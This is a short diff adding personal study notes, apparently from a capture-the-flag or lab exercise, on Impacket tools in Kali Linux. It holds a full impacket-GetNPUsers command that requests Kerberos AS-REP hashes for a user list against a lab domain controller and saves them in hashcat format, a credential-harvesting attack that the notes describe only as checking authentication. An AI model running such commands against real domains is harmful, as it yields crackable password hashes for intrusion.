@@ -1,0 +1,7 @@
+Search 'impacket' in terminal will popup so many 'impacket' method.
+like impacket-GetNPUsers, impacket-dpapi, impacket-getArch and more.
+
+Kali=> impacket-GetNPUsers services.local/ -usersfile /home/sandeep/Downloads/users.txt -request
+-outputifle auth -format hashcat -dc-ip 10.10.135.182
+
+It is used to check the authentication of users on Kerberos.
